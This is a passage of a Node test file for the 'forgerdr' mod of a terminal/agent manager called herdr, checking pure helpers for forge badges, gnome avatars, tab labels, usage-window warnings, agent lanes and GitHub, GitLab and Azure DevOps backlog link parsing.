// The forgerdr mod's pure logic, which imports neither herdr nor gpui-kit, under Node's own runner. Node is not herdr's
// runtime: herdr-app check and the gallery cover that.
// Run: node --test test/herdr-mod.test.mjs
import { deepStrictEqual, strictEqual } from "node:assert";
import { readdirSync, readFileSync } from "node:fs";
import { test } from "node:test";
import {
  CARD_STATUS,
  FLOW_CELL,
  floorCounts,
  floorMood,
  floorOf,
  MANUAL_CELLS,
  PIPELINE,
  portOf,
  progressOf,
  statusOf,
  stripOf,
  tasksOf,
} from "../herdr/mods/forgerdr/floor.js";
import {
  crackedOf,
  forgeMood,
  forgeMoves,
  forgeState,
  groupForges,
  knownGit,
  lookKeyOf,
  newlyCracked,
} from "../herdr/mods/forgerdr/forges.js";
import { keyLabel } from "../herdr/mods/forgerdr/format.js";
import {
  brotherOf,
  GNOME_PART,
  gnomeLookOf,
  hatColourOf,
  nameOf,
  PART_OPTIONS,
  rerolled,
  turnPart,
} from "../herdr/mods/forgerdr/identity.js";
import {
  aboveOf,
  answersOf,
  approvable,
  armed,
  cardsOf,
  countsOf,
  denyAnswer,
  FILTER,
  FILTER_ORDER,
  headingOf,
  INBOX_KIND,
  MARK,
  markedAt,
  markOf,
  openCardOf,
  originOf,
  PLAN_MODE,
  permissionAnswer,
  pickOption,
  planAnswer,
  questionAnswer,
  quietAfter,
  quietNow,
  reviewAskOf,
  reviewTabOf,
  shownIn,
  summaryOf,
  waitedFor,
} from "../herdr/mods/forgerdr/inbox.js";
import {
  byUrgency,
  elapsed,
  golemStatus,
  lanesHeight,
  lanesOf,
  orphanedReviews,
  spaceLanes,
  spaceOfTerminal,
  withParkedAgents,
} from "../herdr/mods/forgerdr/lanes.js";
import {
  backlogOf,
  backlogTyped,
  MODE,
  modeKind,
  modeLabel,
  shortLabel,
} from "../herdr/mods/forgerdr/modes.js";
import {
  folderLabel,
  newSwipe,
  paneLabel,
  programKind,
  swipeTab,
  tabLabel,
} from "../herdr/mods/forgerdr/sessions.js";
import {
  belongsTo,
  changeRows,
  ideaLaunches,
  linkOf,
  reviewRows,
  startLaunches,
  titleOf,
  workRows,
} from "../herdr/mods/forgerdr/start.js";
import { scrollTarget, stripState } from "../herdr/mods/forgerdr/strip.js";
import {
  bandOf,
  clockOf,
  fillLevel,
  historyBars,
  keptWarnings,
  resetsIn,
  runningWindows,
  warningsDue,
} from "../herdr/mods/forgerdr/usage.js";
import {
  closingPanes,
  folderOf,
  golemsAtWork,
  itemArg,
  spacesOn,
  stillRemovable,
  terminalsIn,
  worktreeArgs,
} from "../herdr/mods/forgerdr/worktrees.js";

test("a key binding reads as its keycaps", () => {
  strictEqual(keyLabel("cmd-shift-p"), "⌘⇧P");
  strictEqual(keyLabel("ctrl-alt-t"), "⌃⌥T");
  strictEqual(keyLabel("k"), "K");
});

test("a forge keeps its hat colour, and forges spread over the six", () => {
  strictEqual(hatColourOf("/work/acme-shop"), hatColourOf("/work/acme-shop"));
  const colours = new Set(
    ["/a", "/b", "/c", "/d", "/e", "/f", "/g", "/h", "/i", "/j"].map(
      hatColourOf,
    ),
  );
  strictEqual(colours.size > 1, true);
  for (const colour of colours)
    strictEqual(
      ["crimson", "forest", "indigo", "ochre", "teal", "plum"].includes(colour),
      true,
    );
});

test("a golem waiting on the human wins the forge's badge", () => {
  deepStrictEqual(
    forgeState([
      { status: "working" },
      { status: "blocked" },
      { status: "done" },
    ]),
    {
      badge: { content: "!", tone: "needs" },
      mood: "needs",
    },
  );
});

test("golems at work are counted, then a finished one shows", () => {
  deepStrictEqual(
    forgeState([
      { status: "working" },
      { status: "working" },
      { status: "done" },
    ]),
    {
      badge: { content: "2", tone: "working" },
      mood: "working",
    },
  );
  deepStrictEqual(forgeState([{ status: "done" }, { status: "idle" }]), {
    badge: { content: "✓", tone: "done" },
    mood: "done",
  });
});

test("a forge with nothing going on has no badge", () => {
  deepStrictEqual(forgeState([]), { badge: undefined, mood: "asleep" });
  deepStrictEqual(forgeState([{ status: "idle" }]), {
    badge: undefined,
    mood: "idle",
  });
});

test("a row that fits shows no arrows", () => {
  const state = stripState([100, 100, 40], 300, 0);
  strictEqual(state.overflows, false);
  strictEqual(scrollTarget(state, "left"), null);
  strictEqual(scrollTarget(state, "right"), null);
});

test("an overflowing row brings in the next hidden tab on each side", () => {
  // Tabs at 0-100, 100-200, 200-300, 300-400; the strip shows 150 px from 120.
  const state = stripState([100, 100, 100, 100], 150, 120);
  strictEqual(state.overflows, true);
  strictEqual(scrollTarget(state, "left"), 1);
  strictEqual(scrollTarget(state, "right"), 2);
  strictEqual(state.after(2), 150);
  strictEqual(state.after(0), 0);
  strictEqual(state.after(1), 100);
});

test("the scroll never leaves the row's bounds", () => {
  const state = stripState([100, 100, 100], 150, 900);
  strictEqual(state.position, 150);
  strictEqual(state.clamp(-40), 0);
  strictEqual(scrollTarget(state, "right"), null);
});

test("a forge keeps its brother, and brothers spread", () => {
  strictEqual(brotherOf("/work/acme-shop"), brotherOf("/work/acme-shop"));
  strictEqual(brotherOf("/work/acme-shop").startsWith("Brother "), true);
  strictEqual(
    new Set(["/a", "/b", "/c", "/d", "/e", "/f"].map(brotherOf)).size > 1,
    true,
  );
});

test("spaces of one repository make one forge, its main checkout first", () => {
  const space = (id) => ({ id, name: id });
  const git = {
    api: {
      ahead: 0,
      behind: 0,
      branch: "main",
      linked: false,
      repo: "/w/api/.git",
    },
    login: {
      ahead: 1,
      behind: 0,
      branch: "feature/#42-login",
      linked: true,
      repo: "/w/api/.git",
    },
    notes: null,
  };
  const forges = groupForges(
    [space("login"), space("notes"), space("api")],
    git,
  );
  deepStrictEqual(
    forges.map((forge) => [
      forge.key,
      forge.main.id,
      forge.spaces.map((s) => s.id),
    ]),
    [
      ["/w/api/.git", "api", ["api", "login"]],
      ["space:notes", "notes", ["notes"]],
    ],
  );
});

test("a forge's gnome's mood, with its golems", () => {
  const agents = [
    { status: "working" },
    { status: "working" },
    { status: "blocked" },
    { status: "idle" },
  ];
  strictEqual(forgeMood(agents), "needs you · 4 golems");
  strictEqual(forgeMood([{ status: "idle" }]), "idle · 1 golem");
});

test("a forge dragged onto another moves as one block, each move counting the ones before it", () => {
  // Spaces in the app's order: a's worktree sits apart from its main checkout.
  const order = ["a", "b", "a2", "c"];
  const forge = (key, ...ids) => ({
    key,
    main: { id: ids[0] },
    spaces: ids.map((id) => ({ id })),
  });
  const forges = [forge("A", "a", "a2"), forge("B", "b"), forge("C", "c")];
  const apply = (moves) =>
    moves.reduce((ids, { id, index }) => {
      const rest = ids.filter((other) => other !== id);
      return rest.toSpliced(index - 1, 0, id);
    }, order);
  deepStrictEqual(apply(forgeMoves(order, forges, "A", "C")), [
    "b",
    "c",
    "a",
    "a2",
  ]);
  deepStrictEqual(apply(forgeMoves(order, forges, "C", "A")), [
    "c",
    "a",
    "a2",
    "b",
  ]);
  deepStrictEqual(apply(forgeMoves(order, forges, "B", "B")), order);
  deepStrictEqual(forgeMoves(order, forges, "A", "missing"), []);
});

test("a forge looks the same whichever of its spaces is open", () => {
  // Its repository, whichever checkout is open.
  strictEqual(lookKeyOf({ key: "/w/api/.git" }), "/w/api");
  strictEqual(lookKeyOf({ key: "dev-box:/w/api/.git" }), "dev-box:/w/api");
  // Outside git, its space: the folder the app gives a space is where its new terminals start, not where it is.
  strictEqual(lookKeyOf({ key: "space:sp7" }), "space:sp7");
});

test("what git said of each space lasts until git is asked again", () => {
  const api = {
    ahead: 0,
    behind: 0,
    branch: "main",
    linked: false,
    repo: "/w/api/.git",
  };
  const login = { ...api, branch: "login", linked: true };
  // A space asked now takes the answer, null outside git; one not asked yet keeps the last; a new one waits.
  deepStrictEqual(
    knownGit(
      ["sp1", "sp2", "sp3", "sp4"],
      new Map([
        ["sp1", login],
        ["sp2", null],
      ]),
      { gone: api, sp1: api, sp2: api, sp3: api },
    ),
    { sp1: login, sp2: null, sp3: api },
  );
  // Before the app has its spaces, nothing is forgotten.
  deepStrictEqual(knownGit([], new Map(), { sp1: api }), { sp1: api });
});

const CLAUDE = {
  agent: true,
  key: "claude",
  name: "Claude Code",
  shell: false,
};
const ZSH = { agent: false, key: "shell", name: "zsh", shell: true };
const VITE = { agent: false, key: "program", name: "node", shell: false };

test("a tab the app named follows its agent's live title; one the human named stays", () => {
  const lead = { program: CLAUDE, terminal: "t5", title: "✳ herdr v2 ui" };
  strictEqual(tabLabel({ name: "1", named: false }, lead), "herdr v2 ui");
  strictEqual(
    tabLabel({ name: "Claude Code", named: true }, lead),
    "herdr v2 ui",
  );
  strictEqual(tabLabel({ name: "review", named: true }, lead), "review");
  // A title that is only a path, an address or the program says nothing.
  strictEqual(
    tabLabel({ name: "1", named: false }, { ...lead, title: "~/projects/api" }),
    "Claude Code",
  );
  strictEqual(
    tabLabel({ name: "1", named: false }, { ...lead, title: "me@host" }),
    "Claude Code",
  );
  strictEqual(
    tabLabel(
      { name: "1", named: false },
      { program: ZSH, terminal: "t1", title: "vim" },
    ),
    "zsh",
  );
  strictEqual(tabLabel({ name: "1", named: false }, undefined), "Terminal");
});

test("a pane is named for its agent, its shell or its program", () => {
  strictEqual(
    paneLabel({ program: CLAUDE, terminal: "t5", title: "⠂ claude · main" }),
    "claude · main",
  );
  strictEqual(
    paneLabel({ program: CLAUDE, terminal: "t5", title: "t5" }),
    "Claude Code",
  );
  strictEqual(
    paneLabel({ program: ZSH, terminal: "t1", title: "~/api" }),
    "zsh",
  );
  strictEqual(
    paneLabel({ program: VITE, terminal: "t2", title: "pnpm dev" }),
    "pnpm dev",
  );
  strictEqual(
    [CLAUDE, ZSH, VITE, undefined].map(programKind).join(" "),
    "agent shell program shell",
  );
});

test("a folder under home reads with ~", () => {
  strictEqual(
    folderLabel("/Users/me/projects/api", "/Users/me"),
    "~/projects/api",
  );
  strictEqual(folderLabel("/Users/me", "/Users/me"), "~");
  strictEqual(folderLabel("/Users/meg", "/Users/me"), "/Users/meg");
  strictEqual(folderLabel(null, "/Users/me"), "");
});

test("a wheel swipe moves one tab, then one per longer stretch, never faster than they show", () => {
  const roll = (events) =>
    events.reduce(
      ({ swipe, went }, [dy, now, started = false]) => {
        const step = swipeTab(swipe, { dy, started }, now);
        return { swipe: step.swipe, went: step.go ? [...went, step.go] : went };
      },
      { swipe: newSwipe(), went: [] },
    ).went;
  deepStrictEqual(
    roll([
      [10, 1000, true],
      [15, 1010],
    ]),
    ["prev"],
  );
  // Another 60 px is the next tab, but not within 100 ms of the last.
  deepStrictEqual(
    roll([
      [25, 1000, true],
      [70, 1050],
      [10, 1120],
    ]),
    ["prev", "prev"],
  );
  // A pause starts a new gesture.
  deepStrictEqual(
    roll([
      [-25, 1000, true],
      [-25, 1400],
    ]),
    ["next", "next"],
  );
  strictEqual(
    swipeTab(newSwipe(), { dy: 0, lines: -1, started: false }, 0).go,
    "next",
  );
});

test("a window not sent or past its reset is hidden, not shown at 0 %", () => {
  const snapshot = {
    at: 1000,
    windows: {
      five_hour: { resets_at: 900, used: 62 },
      seven_day: { resets_at: 5000, used: 41 },
    },
  };
  deepStrictEqual(Object.keys(runningWindows(snapshot, 1000)), ["seven_day"]);
  deepStrictEqual(runningWindows(null, 1000), {});
});

test("a reset reads in days, hours and minutes", () => {
  strictEqual(resetsIn(1000 + 72 * 60, 1000), "1h 12m");
  strictEqual(resetsIn(1000 + (3 * 1440 + 4 * 60 + 5) * 60, 1000), "3d 4h");
  strictEqual(resetsIn(1000 + 12 * 60 + 30, 1000), "12m");
  strictEqual(resetsIn(1010, 1000), "<1m");
});

test("the heat turns at 80 % and 95 %, and each warning is told once a period", () => {
  deepStrictEqual([79.9, 80, 94, 95, 100].map(bandOf), [
    "heat",
    "warn",
    "warn",
    "danger",
    "danger",
  ]);
  const windows = {
    five_hour: { resets_at: 5000, used: 96 },
    seven_day: { resets_at: 9000, used: 50 },
  };
  const due = warningsDue(windows, []);
  deepStrictEqual(
    due.map((w) => w.key),
    ["five_hour:5000:80", "five_hour:5000:95"],
  );
  deepStrictEqual(
    warningsDue(windows, ["five_hour:5000:80"]).map((w) => w.threshold),
    [95],
  );
  deepStrictEqual(
    keptWarnings(["five_hour:5000:80", "five_hour:900:95"], 1000),
    ["five_hour:5000:80"],
  );
});

test("a reset reads on the local clock", () => {
  // 19 November 2026 was a Thursday.
  strictEqual(
    clockOf(new Date(2026, 10, 19, 1, 0).getTime() / 1000),
    "Thu 01:00",
  );
  strictEqual(
    clockOf(new Date(2026, 10, 22, 19, 5).getTime() / 1000),
    "Sun 19:05",
  );
});

test("a window's history is the rise in use within each stretch of its period", () => {
  const resets = 100_000;
  const start = resets - 5 * 3600;
  const half = 1800;
  const samples = [
    { at: start - 60, five_hour: 90 }, // the period before: left out
    { at: start + 60, five_hour: 2 },
    { at: start + half + 60, five_hour: 10 },
    { at: start + half + 600, five_hour: 12 },
    { at: start + 3 * half + 60, five_hour: 20, seven_day: 40 },
  ];
  deepStrictEqual(
    historyBars(samples, "five_hour", { resets_at: resets, used: 20 }),
    [2, 10, 0, 8, 0, 0, 0, 0, 0, 0],
  );
  // Seen only from the third stretch on: what came before is where it starts, not a bar.
  const late = [
    { at: start + 2 * half + 60, five_hour: 28 },
    { at: start + 3 * half + 60, five_hour: 31 },
  ];
  deepStrictEqual(
    historyBars(late, "five_hour", { resets_at: resets, used: 31 }),
    [0, 0, 0, 3, 0, 0, 0, 0, 0, 0],
  );
});

test("a golem's crucible fills a level a quarter of its context, half on a clay one", () => {
  deepStrictEqual(
    [0, 1, 25, 26, 50, 75, 76, 100, 130].map((p) => fillLevel(p, 4)),
    [0, 1, 1, 2, 2, 3, 4, 4, 4],
  );
  deepStrictEqual(
    [0, 30, 50, 51, 100].map((p) => fillLevel(p, 2)),
    [0, 1, 1, 2, 2],
  );
});

test("a session's lanes are its agents in their own terminals, then its subagents inside it", () => {
  const terminals = [
    {
      address: "t5",
      records: { a1: { state: "working", title: "explore" } },
      status: "working",
      title: "claude · main",
    },
    {
      address: "t8",
      created_ms: 1000,
      parent: "t5",
      report: { msg: 'Grep("snapshot")' },
      status: "working",
      title: "review",
    },
    {
      address: "t9",
      created_ms: 2000,
      labels: { "forge.parent": "t5", "forge.state": "cracked" },
      parent: null,
      status: "idle",
      status_ms: 9000,
      title: "resize",
    },
    { address: "t3", status: "idle", title: "elsewhere" },
  ];
  const lanes = lanesOf(
    terminals[0],
    terminals,
    { t8: { used: 40 } },
    { "t5/a1": 500 },
  );
  deepStrictEqual(
    lanes.map((l) => [
      l.id,
      l.name,
      l.status,
      l.context,
      l.since,
      l.until,
      l.activity,
    ]),
    [
      ["t8", "review", "working", 40, 1000, undefined, 'Grep("snapshot")'],
      ["t9", "resize", "cracked", undefined, 2000, 9000, ""],
      ["t5/a1", "explore", "working", undefined, 500, undefined, ""],
    ],
  );
  strictEqual(golemStatus({ address: "t1" }), "idle");
});

test("a lane's time reads in minutes and seconds, then hours", () => {
  strictEqual(elapsed(0, 72_000), "1m 12s");
  strictEqual(elapsed(0, 55_000), "0m 55s");
  strictEqual(elapsed(0, 3_780_000), "1h 3m");
  strictEqual(elapsed(undefined, 1000), "");
});

test("a space's lanes gather every session's golems, wherever their panes are, the most urgent first", () => {
  const terminals = [
    {
      address: "t5",
      labels: { "herdr.space": "sp1" },
      records: { a1: { state: "working", title: "explore" } },
      title: "main",
    },
    { address: "t6", labels: { "herdr.space": "sp1" }, title: "other session" },
    {
      address: "t8",
      created_ms: 100,
      labels: { "forge.parent": "t5", "herdr.space": "sp1" },
      status: "done",
      title: "review",
    },
    {
      address: "t9",
      created_ms: 200,
      labels: { "forge.parent": "t6" },
      status: "blocked",
      title: "asks",
    },
    {
      address: "t10",
      created_ms: 300,
      labels: { "forge.parent": "t8" },
      status: "working",
      title: "nested",
    },
    {
      address: "t11",
      labels: { "forge.parent": "t5" },
      state: "finished",
      status: "done",
      title: "gone",
    },
    { address: "t20", labels: { "herdr.space": "sp2" }, title: "elsewhere" },
    {
      address: "t21",
      labels: { "forge.parent": "t20" },
      status: "working",
      title: "not here",
    },
  ];
  deepStrictEqual(
    spaceLanes("sp1", terminals, {}, { "t5/a1": 50 }).map(
      (lane) => `${lane.name}:${lane.status}`,
    ),
    ["asks:blocked", "nested:working", "explore:working", "review:done"],
  );
  deepStrictEqual(spaceLanes("sp3", terminals, {}, {}), []);
  deepStrictEqual(
    byUrgency([
      { id: "a", since: 1, status: "done" },
      { id: "b", since: 2, status: "cracked" },
      { id: "c", since: 3, status: "working" },
      { id: "d", since: 4, status: "working" },
    ]).map((lane) => lane.id),
    ["b", "d", "c", "a"],
  );
});

test("folded, the lanes are one line; unfolded, a head and a row a lane up to five", () => {
  strictEqual(lanesHeight(3, false), 36);
  strictEqual(lanesHeight(0, true), 36);
  strictEqual(lanesHeight(3, true), 34 + 3 * 34 + 2);
  strictEqual(lanesHeight(9, true), 34 + 5 * 34 + 2);
});

test("a lane's time is its current task's, from the hook's labels, and stops when the task does", () => {
  const lead = { address: "t5" };
  const agent = {
    address: "t8",
    created_ms: 1,
    labels: {
      "forge.parent": "t5",
      "forge.started": "1000",
      "forge.stopped": "61000",
    },
    status: "done",
    status_ms: 999_999,
  };
  const [lane] = lanesOf(lead, [lead, agent], {}, {});
  deepStrictEqual([lane.since, lane.until], [1000, 61000]);
  const [working] = lanesOf(
    lead,
    [lead, { ...agent, status: "working" }],
    {},
    {},
  );
  strictEqual(working.until, undefined);
});

test("a cracked golem breaks its forge's mood after one waiting on the human; a forge with none sleeps", () => {
  deepStrictEqual(forgeState([{ status: "working" }, { status: "cracked" }]), {
    badge: { content: "×", tone: "failed" },
    mood: "error",
  });
  strictEqual(
    forgeState([{ status: "cracked" }, { status: "blocked" }]).mood,
    "needs",
  );
  strictEqual(forgeMood([{ status: "cracked" }]), "cracked · 1 golem");
  strictEqual(forgeMood([]), "asleep · 0 golems");
});

test("a forge's gnome is whole from its key, and the human can rename it", () => {
  const look = gnomeLookOf("/w/api");
  deepStrictEqual(gnomeLookOf("/w/api"), look);
  deepStrictEqual(Object.keys(look).toSorted(), [
    "accessory",
    "beard",
    "colour",
    "eyes",
    "hat",
  ]);
  strictEqual(look.colour, hatColourOf("/w/api"));
  const keys = ["/a", "/b", "/c", "/d", "/e", "/f", "/g", "/h"];
  strictEqual(
    new Set(keys.map((key) => JSON.stringify(gnomeLookOf(key)))).size > 4,
    true,
  );
  strictEqual(nameOf("/w/api", {}), brotherOf("/w/api"));
  strictEqual(
    nameOf("/w/api", { "/w/api": "Brother Vulcan" }),
    "Brother Vulcan",
  );
  strictEqual(nameOf("/w/api", { "/w/api": "  " }), brotherOf("/w/api"));
});

test("the human picks a gnome's parts over the ones its key rolls", () => {
  const rolled = gnomeLookOf("/w/api");
  // No choice, or an empty one, is the key's gnome.
  deepStrictEqual(gnomeLookOf("/w/api", {}), rolled);
  deepStrictEqual(gnomeLookOf("/w/api", { roll: 0 }), rolled);
  // A picked part wins; the others stay the key's.
  const other = PART_OPTIONS.hat.find((hat) => hat !== rolled.hat);
  deepStrictEqual(gnomeLookOf("/w/api", { hat: other }), {
    ...rolled,
    hat: other,
  });
  // A part this version does not know is the key's.
  deepStrictEqual(
    gnomeLookOf("/w/api", { hat: "crown", roll: Number.NaN }),
    rolled,
  );
});

test("a part turns through its options and back round", () => {
  for (const part of Object.values(GNOME_PART)) {
    const options = PART_OPTIONS[part];
    let choice = {};
    const seen = [];
    for (let turn = 0; turn < options.length; turn += 1) {
      choice = turnPart("/w/api", choice, part, 1);
      seen.push(gnomeLookOf("/w/api", choice)[part]);
    }
    deepStrictEqual(seen.toSorted(), [...options].toSorted());
    strictEqual(seen.at(-1), gnomeLookOf("/w/api")[part]);
  }
  const back = turnPart("/w/api", {}, GNOME_PART.colour, -1);
  const options = PART_OPTIONS.colour;
  const at = options.indexOf(gnomeLookOf("/w/api").colour);
  strictEqual(back.colour, options[(at + options.length - 1) % options.length]);
});

test("a re-roll is a new whole gnome, and the human's picks go with the old one", () => {
  const keys = ["/a", "/b", "/c", "/d", "/e", "/f", "/g", "/h"];
  for (const key of keys) {
    const picked = turnPart(key, {}, GNOME_PART.accessory, 1);
    const next = rerolled(key, picked);
    deepStrictEqual(Object.keys(next), ["roll"]);
    strictEqual(next.roll > 0, true);
    strictEqual(
      JSON.stringify(gnomeLookOf(key, next)) !==
        JSON.stringify(gnomeLookOf(key, picked)),
      true,
    );
    deepStrictEqual(gnomeLookOf(key, next), gnomeLookOf(key, next));
  }
  strictEqual(
    rerolled("/a", rerolled("/a", {})).roll > rerolled("/a", {}).roll,
    true,
  );
});

const ORDERS = {
  org: undefined,
  project: "northwind/orders",
  provider: "github",
  repo: "orders",
};
const SHOP = {
  azure_project: "Shop Platform",
  org: "https://dev.azure.com/acme",
  provider: "azure",
  repo: "Check.Out",
};

test("a pasted line is a pull request, an item or skipped", () => {
  deepStrictEqual(linkOf(" https://github.com/northwind/orders/pull/42 "), {
    id: "42",
    kind: "pr",
    project: "northwind/orders",
    provider: "github",
    repo: "orders",
    url: "https://github.com/northwind/orders/pull/42",
  });
  strictEqual(
    linkOf("https://github.com/northwind/orders/issues/31#top").kind,
    "item",
  );
  strictEqual(
    linkOf("https://github.com/northwind/orders/issues/31#top").url,
    "https://github.com/northwind/orders/issues/31",
  );
  deepStrictEqual(
    linkOf("https://gitlab.example.com/shop/web/storefront/-/merge_requests/9"),
    {
      id: "9",
      kind: "pr",
      project: "shop/web/storefront",
      provider: "gitlab",
      repo: "storefront",
      url: "https://gitlab.example.com/shop/web/storefront/-/merge_requests/9",
    },
  );
  strictEqual(linkOf("https://gitlab.com/g/r/-/issues/3").kind, "item");
  deepStrictEqual(
    linkOf(
      "https://dev.azure.com/acme/Shop%20Platform/_git/Check.Out/pullrequest/4242",
    ),
    {
      id: "4242",
      kind: "pr",
      org: "https://dev.azure.com/acme",
      provider: "azure",
      repo: "Check.Out",
      url: "https://dev.azure.com/acme/Shop%20Platform/_git/Check.Out/pullrequest/4242",
    },
  );
  deepStrictEqual(
    linkOf("https://acme.visualstudio.com/Shop/_workitems/edit/1234/"),
    {
      id: "1234",
      kind: "item",
      org: "https://dev.azure.com/acme",
      provider: "azure",
      url: "https://acme.visualstudio.com/Shop/_workitems/edit/1234/",
    },
  );
  deepStrictEqual(linkOf("hello world"), {
    kind: "skip",
    line: "hello world",
    reason: "not a supported URL",
  });
});

test("a link belongs to the forge of its repository; a work item to any Azure forge", () => {
  const link = (url) => linkOf(url);
  strictEqual(
    belongsTo(link("https://github.com/NorthWind/ORDERS/issues/1"), ORDERS),
    true,
  );
  strictEqual(
    belongsTo(link("https://github.com/northwind/other/issues/1"), ORDERS),
    false,
  );
  strictEqual(
    belongsTo(
      link(
        "https://dev.azure.com/acme/Shop%20Platform/_git/check.out/pullrequest/4",
      ),
      SHOP,
    ),
    true,
  );
  strictEqual(
    belongsTo(
      link("https://dev.azure.com/other/X/_git/Check.Out/pullrequest/4"),
      SHOP,
    ),
    false,
  );
  strictEqual(
    belongsTo(link("https://dev.azure.com/other/X/_workitems/edit/4"), SHOP),
    true,
  );
  strictEqual(
    belongsTo(link("https://dev.azure.com/acme/X/_workitems/edit/4"), ORDERS),
    false,
  );
});

const GITLAB = {
  host: "gitlab.example.com",
  project: "shop/web/storefront",
  provider: "gitlab",
  repo: "storefront",
};
const WAY = { dev: true, flow: "manual", where: "worktrees" };

test("a forge's mode, as the sidebar shows it", () => {
  strictEqual(modeKind("openspec:team-specs"), MODE.openspec);
  strictEqual(modeKind("github"), MODE.github);
  strictEqual(modeKind("bogus"), MODE.chat);
  deepStrictEqual(modeLabel({ mode: "chat" }), {
    detail: "designs in the conversation",
    name: "Chat",
  });
  deepStrictEqual(modeLabel({ mode: "openspec" }), {
    detail: "in this repository",
    name: "OpenSpec",
  });
  deepStrictEqual(modeLabel({ mode: "openspec:team-specs" }), {
    detail: "store team-specs",
    name: "OpenSpec",
  });
  deepStrictEqual(
    modeLabel({ ...ORDERS, host: "github.com", mode: "github" }),
    {
      detail: "northwind/orders",
      name: "GitHub",
    },
  );
  deepStrictEqual(
    modeLabel({ ...ORDERS, host: "github.com", mode: "gitlab" }),
    {
      detail: "no project yet",
      name: "GitLab",
    },
  );
  // Work that comes from elsewhere than the code shows both, as the mode dialog does.
  deepStrictEqual(
    modeLabel({
      ...ORDERS,
      backlog: "https://gitlab.com/team/issues",
      host: "github.com",
      mode: "gitlab",
    }),
    { code: "northwind/orders", detail: "team/issues", name: "GitLab" },
  );
  deepStrictEqual(
    modeLabel({
      ...ORDERS,
      backlog: "https://github.com/northwind/orders",
      host: "github.com",
      mode: "github",
    }),
    { detail: "northwind/orders", name: "GitHub" },
  );
  deepStrictEqual(modeLabel({ ...SHOP, backlog: "", mode: "azure" }), {
    detail: "acme/Shop Platform",
    name: "Azure DevOps",
  });
  deepStrictEqual(
    modeLabel({
      ...SHOP,
      backlog: "https://dev.azure.com/other/Backlog",
      mode: "azure",
    }),
    {
      code: "acme/Shop Platform/Check.Out",
      detail: "other/Backlog",
      name: "Azure DevOps",
    },
  );
  deepStrictEqual(
    modeLabel({
      ...SHOP,
      backlog: "https://dev.azure.com/acme/Shop%20Platform",
      mode: "azure",
    }),
    { detail: "acme/Shop Platform", name: "Azure DevOps" },
  );
});

test("the sidebar's foot keeps the first part of each place, its organization or owner", () => {
  deepStrictEqual(
    shortLabel({
      code: "acme/Shop Platform/Check.Out",
      detail: "other/Backlog",
      name: "Azure DevOps",
    }),
    { code: "acme", detail: "other", name: "Azure DevOps" },
  );
  deepStrictEqual(shortLabel({ detail: "northwind/orders", name: "GitHub" }), {
    detail: "northwind",
    name: "GitHub",
  });
  deepStrictEqual(
    shortLabel({ detail: "store team-specs", name: "OpenSpec" }),
    {
      detail: "store team-specs",
      name: "OpenSpec",
    },
  );
});

test("a forge's work comes from its backlog, else from its origin on the mode's provider", () => {
  // Azure DevOps: its repository's project, else the one it names.
  strictEqual(
    backlogOf({ ...SHOP, backlog: "", mode: "azure" }),
    "https://dev.azure.com/acme/Shop%20Platform",
  );
  strictEqual(
    backlogOf({
      ...SHOP,
      backlog: "https://dev.azure.com/other/Back Log",
      mode: "azure",
    }),
    "https://dev.azure.com/other/Back%20Log",
  );
  // GitHub and GitLab: the origin's repository when it is on that provider.
  strictEqual(
    backlogOf({ ...ORDERS, backlog: "", host: "github.com", mode: "github" }),
    "https://github.com/northwind/orders",
  );
  strictEqual(
    backlogOf({ ...ORDERS, backlog: "", host: "github.com", mode: "gitlab" }),
    "",
  );
  strictEqual(
    backlogOf({
      ...ORDERS,
      backlog: "https://gitlab.com/team/issues/",
      host: "github.com",
      mode: "gitlab",
    }),
    "https://gitlab.com/team/issues",
  );
  // Asked for another kind than its mode's, a forge's own backlog is not that kind's.
  strictEqual(
    backlogOf(
      {
        ...SHOP,
        backlog: "https://dev.azure.com/other/Backlog",
        mode: "azure",
      },
      MODE.github,
    ),
    "",
  );
  strictEqual(backlogOf({ mode: "chat", provider: "github" }), "");
  // The backlog /azdo:init keeps wins on Azure DevOps: the azdospec skills work on it.
  const azdo = {
    ...SHOP,
    azdospec_backlog: "https://dev.azure.com/contoso/Back%20Office",
    mode: "azure",
  };
  strictEqual(
    backlogOf({ ...azdo, backlog: "" }),
    "https://dev.azure.com/contoso/Back%20Office",
  );
  strictEqual(
    backlogOf({ ...azdo, backlog: "https://dev.azure.com/other/X" }),
    "https://dev.azure.com/contoso/Back%20Office",
  );
  deepStrictEqual(modeLabel({ ...azdo, backlog: "" }), {
    code: "acme/Shop Platform/Check.Out",
    detail: "contoso/Back Office",
    name: "Azure DevOps",
  });
  strictEqual(
    backlogOf({
      ...ORDERS,
      azdospec_backlog: "https://dev.azure.com/contoso/X",
      host: "github.com",
      mode: "github",
    }),
    "https://github.com/northwind/orders",
  );
});

test("the backlog typed in the mode dialog, as a URL", () => {
  const github = { ...ORDERS, host: "github.com" };
  strictEqual(
    backlogTyped(MODE.github, "team/issues", github),
    "https://github.com/team/issues",
  );
  strictEqual(
    backlogTyped(MODE.gitlab, "shop/web/issues", github),
    "https://gitlab.com/shop/web/issues",
  );
  strictEqual(
    backlogTyped(MODE.gitlab, "shop/issues", { ...GITLAB }),
    "https://gitlab.example.com/shop/issues",
  );
  strictEqual(
    backlogTyped(
      MODE.github,
      " https://github.example.com/team/issues.git/ ",
      github,
    ),
    "https://github.example.com/team/issues",
  );
  // Any URL in the repository or project names it.
  strictEqual(
    backlogTyped(
      MODE.github,
      "https://github.com/team/issues/issues/12",
      github,
    ),
    "https://github.com/team/issues",
  );
  strictEqual(
    backlogTyped(
      MODE.gitlab,
      "https://gitlab.com/shop/web/issues/-/issues/7",
      github,
    ),
    "https://gitlab.com/shop/web/issues",
  );
  strictEqual(backlogTyped(MODE.github, "issues", github), null);
  strictEqual(
    backlogTyped(MODE.github, "https://github.com/team", github),
    null,
  );
  // Azure DevOps: a project by its URL, any URL in it, or org/project.
  strictEqual(
    backlogTyped(
      MODE.azure,
      "https://dev.azure.com/acme/Shop%20Platform",
      SHOP,
    ),
    "https://dev.azure.com/acme/Shop%20Platform",
  );
  strictEqual(
    backlogTyped(
      MODE.azure,
      "https://acme@dev.azure.com/acme/Shop%20Platform/_workitems/edit/12",
      SHOP,
    ),
    "https://dev.azure.com/acme/Shop%20Platform",
  );
  strictEqual(
    backlogTyped(
      MODE.azure,
      "https://acme.visualstudio.com/Shop/_boards",
      SHOP,
    ),
    "https://dev.azure.com/acme/Shop",
  );
  strictEqual(
    backlogTyped(MODE.azure, "acme/Shop Platform", SHOP),
    "https://dev.azure.com/acme/Shop%20Platform",
  );
  strictEqual(backlogTyped(MODE.azure, "acme", SHOP), null);
});

test("a GitHub or GitLab forge's work: its issues by URL or number", () => {
  const rows = workRows(
